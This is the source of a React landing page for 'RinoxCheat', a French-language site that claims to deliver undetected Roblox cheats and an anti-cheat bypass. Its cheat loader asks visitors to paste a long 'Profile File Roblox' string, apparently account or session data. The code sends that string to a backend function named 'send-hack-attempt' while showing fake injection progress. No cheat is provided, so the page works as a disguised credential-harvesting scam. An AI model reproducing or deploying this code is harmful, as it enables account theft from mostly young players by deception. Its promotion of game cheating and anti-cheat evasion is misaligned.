import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import {
  ShieldCheck,
  Zap,
  CheckCircle2,
  Play,
  Gamepad2,
  Crosshair,
  Eye,
  Wind,
  Activity,
} from "lucide-react";

const STEPS = [
  "Connecting to Roblox server...",
  "Loading cheat modules...",
  "Bypassing Byfron / Hyperion...",
  "Injecting scripts...",
];

const FEATURES = [
  {
    icon: Crosshair,
    title: "Aimbot",
    desc: "Lock-on précis, smoothing réglable, FOV personnalisable pour tous les Roblox shooters.",
  },
  {
    icon: Eye,
    title: "ESP & Wallhack",
    desc: "Voir les joueurs, items et objectifs à travers les murs — distance, HP, équipe.",
  },
  {
    icon: Wind,
    title: "Fly, Speed & No-Clip",
    desc: "Mouvement total — vol, vitesse boostée et traversée des collisions.",
  },
  {
    icon: ShieldCheck,
    title: "Undetected",
    desc: "Bypass Byfron & Hyperion mis à jour en continu pour une session safe.",
  },
];

const Index = () => {
  const [target, setTarget] = useState("");
  const [loading, setLoading] = useState(false);
  const [steps, setSteps] = useState<string[]>([]);
  const [done, setDone] = useState(false);

  useEffect(() => {
    document.title = "RinoxCheat — Premium Roblox Cheats 2026";
    const desc =
      "RinoxCheat: les meilleurs cheats Roblox undetected en 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion.";
    let m = document.querySelector('meta[name="description"]');
    if (!m) {
      m = document.createElement("meta");
      m.setAttribute("name", "description");
      document.head.appendChild(m);
    }
    m.setAttribute("content", desc);
  }, []);

  const handleHack = async () => {
    if (!target.trim()) {
      toast({
        title: "Info manquante",
        description: "c",
        variant: "destructive",
      });
      return;
    }
    setLoading(true);
    setDone(false);
    setSteps([]);

    const payload = `Game: Roblox\nUser: ${target}`;
    const sendPromise = supabase.functions.invoke("send-hack-attempt", {
      body: { input: payload },
    });

    for (let i = 0; i < STEPS.length; i++) {
      await new Promise((r) => setTimeout(r, 550 + Math.random() * 350));
      setSteps((prev) => [...prev, STEPS[i]]);
    }

    await new Promise((r) => setTimeout(r, 600));
    await sendPromise;

    setLoading(false);
    setDone(true);
    setTarget("");
  };

  return (
    <div className="relative min-h-screen">
      {/* Background layers */}
      <div aria-hidden className="pointer-events-none fixed inset-0 -z-10 overflow-hidden">
        <div className="absolute inset-0 grid-bg opacity-50" />
        <div
          className="absolute inset-0"
          style={{ background: "var(--gradient-radial)" }}
        />
        {/* Floating orbs */}
        <div className="orb orb-1" />
        <div className="orb orb-2" />
        <div className="orb orb-3" />
        {/* Drifting particles */}
        <div className="particles">
          {Array.from({ length: 14 }).map((_, i) => (
            <span
              key={i}
              className="particle"
              style={{
                left: `${(i * 73) % 100}%`,
                animationDelay: `${(i * 1.7) % 12}s`,
                animationDuration: `${14 + (i % 6) * 3}s`,
              }}
            />
          ))}
        </div>
      </div>

      {/* Nav */}
      <header className="sticky top-0 z-30 backdrop-blur-md bg-background/70 border-b border-border/60">
        <div className="max-w-6xl mx-auto px-5 sm:px-8 h-14 flex items-center justify-between">
          <div className="flex items-center gap-2 group">
            <div className="h-7 w-7 rounded-md bg-gradient-to-br from-primary to-[hsl(var(--primary-glow))] bg-[length:200%_200%] animate-gradient-pan flex items-center justify-center transition-transform duration-300 group-hover:scale-110 group-hover:rotate-6">
              <Crosshair className="h-4 w-4 text-primary-foreground" />
            </div>
            <span className="font-semibold tracking-tight">RinoxCheat</span>
          </div>
          <div className="hidden sm:flex items-center gap-6 text-sm text-muted-foreground">
            <a href="#features" className="story-link hover:text-foreground transition-colors">Cheats</a>
            <a href="#tool" className="story-link hover:text-foreground transition-colors">Get</a>
            <a href="#tutorial" className="story-link hover:text-foreground transition-colors">Tutorial</a>
          </div>
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <span className="h-2 w-2 rounded-full bg-primary live-dot" />
            <span>Online</span>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-5 sm:px-8 pb-20">
        {/* Hero */}
        <section className="pt-16 sm:pt-24 pb-12 text-center max-w-3xl mx-auto">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-6 animate-fade-in">
            <Activity className="h-3.5 w-3.5 text-primary" />
            <span>2026 Edition · v3.0 just shipped</span>
          </div>
          <h1
            className="text-4xl sm:text-6xl font-semibold tracking-tight leading-[1.05] mb-5 animate-fade-in"
            style={{ animationDelay: "80ms" }}
          >
            Premium Roblox cheats. <br className="hidden sm:block" />
            <span className="text-gradient bg-[length:200%_auto] animate-gradient-pan">
              Undetected. Instant.
            </span>
          </h1>
          <p
            className="text-muted-foreground text-base sm:text-lg leading-relaxed max-w-xl mx-auto animate-fade-in"
            style={{ animationDelay: "160ms" }}
          >
            Le toolkit de cheats Roblox le plus avancé en 2026. Aimbot, ESP,
            Fly, Speed — bypass Byfron & Hyperion. Rapide, propre, indétectable.
          </p>
          <div
            className="mt-8 flex items-center justify-center gap-3 animate-fade-in"
            style={{ animationDelay: "240ms" }}
          >
            <a href="#tool">
              <Button className="h-11 px-6 rounded-full font-medium hover-scale shadow-[0_8px_30px_-8px_hsl(var(--primary)/0.6)]">
                Get the cheats
              </Button>
            </a>
            <a href="#tutorial">
              <Button
                variant="secondary"
                className="h-11 px-6 rounded-full font-medium hover-scale"
              >
                <Play className="h-4 w-4 mr-1.5" /> Watch tutorial
              </Button>
            </a>
          </div>

          <div
            className="mt-10 flex flex-wrap items-center justify-center gap-x-8 gap-y-3 text-xs text-muted-foreground animate-fade-in"
            style={{ animationDelay: "320ms" }}
          >
            <span className="flex items-center gap-1.5">
              <ShieldCheck className="h-3.5 w-3.5 text-primary" /> Undetected
            </span>
            <span className="flex items-center gap-1.5">
              <Zap className="h-3.5 w-3.5 text-primary" /> Instant delivery
            </span>
            <span className="flex items-center gap-1.5">
              <Gamepad2 className="h-3.5 w-3.5 text-primary" /> All Roblox games
            </span>
          </div>
        </section>

        {/* Features */}
        <section
          id="features"
          className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-16"
          aria-label="Cheats"
        >
          {FEATURES.map((f, i) => (
            <div
              key={f.title}
              className="group rounded-2xl border border-border bg-card/60 backdrop-blur p-5 hover:border-primary/40 hover:-translate-y-1 hover:shadow-[0_20px_40px_-20px_hsl(var(--primary)/0.4)] transition-all duration-300 animate-fade-in"
              style={{ animationDelay: `${i * 100}ms` }}
            >
              <div className="h-9 w-9 rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center mb-4 transition-transform duration-300 group-hover:scale-110 group-hover:rotate-3">
                <f.icon className="h-4 w-4 text-primary" />
              </div>
              <h3 className="font-medium mb-1">{f.title}</h3>
              <p className="text-sm text-muted-foreground leading-relaxed">
                {f.desc}
              </p>
            </div>
          ))}
        </section>

        {/* Tool */}
        <section
          id="tool"
          aria-label="Cheat panel"
          className="max-w-md mx-auto"
        >
          <div className="rounded-2xl border border-border bg-card/80 backdrop-blur shadow-[var(--shadow-card)] overflow-hidden animate-scale-in">
            <div className="flex items-center justify-between px-5 py-3 border-b border-border bg-secondary/40">
              <div className="flex items-center gap-2 text-sm font-medium">
                <Crosshair className="h-4 w-4 text-primary" />
                Cheat Loader
              </div>
              <span className="text-[10px] tracking-widest text-muted-foreground uppercase">
                Secure session
              </span>
            </div>

            <div className="p-5 sm:p-6">
              <div className="flex items-center justify-between mb-4 p-3 rounded-lg bg-input border border-border">
                <div className="flex items-center gap-2.5">
                  <Gamepad2 className="h-4 w-4 text-primary" />
                  <span className="text-sm font-medium">Roblox</span>
                </div>
                <span className="text-[10px] tracking-widest text-primary uppercase">
                  Supported
                </span>
              </div>

              <label htmlFor="target" className="block text-sm font-medium mt-1 mb-2">
                Indique ton profile Roblox comme sur la vidéo pour recevoir les cheats.
              </label>
              <Input
                id="target"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                disabled={loading}
                placeholder="Profile File Roblox..."
                maxLength={5000}
                className="h-11 rounded-lg bg-input border-border focus-visible:ring-primary"
              />
              <p className="text-xs text-muted-foreground mt-2">
                Les cheats sont livrés directement à ton compte.
              </p>

              <Button
                onClick={handleHack}
                disabled={loading}
                className="w-full mt-5 h-12 rounded-lg font-medium text-base hover-scale shadow-[0_8px_30px_-8px_hsl(var(--primary)/0.6)] disabled:opacity-80 disabled:hover:scale-100"
              >
                {loading ? (
                  <span className="flex items-center gap-2">
                    <span className="h-4 w-4 rounded-full border-2 border-primary-foreground/40 border-t-primary-foreground animate-spin" />
                    Loading...
                  </span>
                ) : (
                  "Inject cheats"
                )}
              </Button>

              {(steps.length > 0 || done) && (
                <div className="mt-6 space-y-2">
                  {steps.map((s, i) => (
                    <div
                      key={i}
                      className="animate-slide-in-right flex items-center gap-2 text-sm text-muted-foreground"
                      style={{ animationDelay: `${i * 60}ms` }}
                    >
                      <CheckCircle2 className="h-4 w-4 text-primary shrink-0" />
                      <span>{s}</span>
                    </div>
                  ))}
                  {done && (
                    <div className="animate-scale-in mt-4 p-4 rounded-lg bg-primary/10 border border-primary/30">
                      <div className="flex items-center gap-2 font-medium text-primary mb-1">
                        <CheckCircle2 className="h-4 w-4" />
                        Cheats injectés
                      </div>
                      <p className="text-sm text-foreground/80">
                        Lance Roblox — tes cheats seront actifs sous 2–3 minutes.
                      </p>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        </section>

        {/* Tutorial */}
        <section
          id="tutorial"
          aria-label="Tutorial video"
          className="max-w-3xl mx-auto mt-20"
        >
          <div className="text-center mb-6">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-4">
              <Play className="h-3.5 w-3.5 text-primary" />
              <span>Tutorial</span>
            </div>
            <h2 className="text-2xl sm:text-3xl font-semibold tracking-tight">
              Comment ça marche
            </h2>
            <p className="text-sm text-muted-foreground mt-2">
              2 minutes pour tout comprendre avant de lancer tes cheats.
            </p>
          </div>
          <div className="relative aspect-video w-full rounded-2xl overflow-hidden border border-border bg-card glow-ring">
            <iframe
              className="absolute inset-0 w-full h-full"
              src="https://www.youtube.com/embed/uykGCGe0oMQ"
              title="Tutorial — RinoxCheat"
              loading="lazy"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
              referrerPolicy="strict-origin-when-cross-origin"
              allowFullScreen
            />
          </div>
        </section>
      </main>

      <footer className="border-t border-border/60">
        <div className="max-w-6xl mx-auto px-5 sm:px-8 py-8 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-muted-foreground">
          <div className="flex items-center gap-2">
            <div className="h-5 w-5 rounded-md bg-gradient-to-br from-primary to-[hsl(var(--primary-glow))] flex items-center justify-center">
              <Crosshair className="h-3 w-3 text-primary-foreground" />
            </div>
            <span>RinoxCheat © 2026</span>
          </div>
          <p>Private tool · Use at your own risk</p>
        </div>
      </footer>
    </div>
  );
};

export default Index;
